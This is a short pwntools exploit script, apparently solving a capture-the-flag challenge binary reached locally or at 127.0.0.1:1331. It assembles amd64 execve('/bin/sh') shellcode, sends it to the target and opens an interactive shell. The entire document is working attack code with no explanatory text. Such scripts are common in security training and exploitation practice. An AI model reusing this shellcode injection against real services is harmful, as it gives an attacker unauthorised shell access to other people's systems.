from pwn import *

filename = './chall'

# elf = context.binary = ELF(filename)

context.arch = "amd64"

def start():
    if len(sys.argv) > 1:
        if sys.argv[1] == 'r':
            return remote("127.0.0.1", 1331)
        elif sys.argv[1] == 'g':
            return gdb.debug(filename, gdbscript)
        elif sys.argv[1] == 'p':
            return process()
    else: exit(1)


gdbscript = '''
b main
'''

shellcode = '''
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
'''

io = start()

io.sendline(asm(shellcode))

io.interactive()
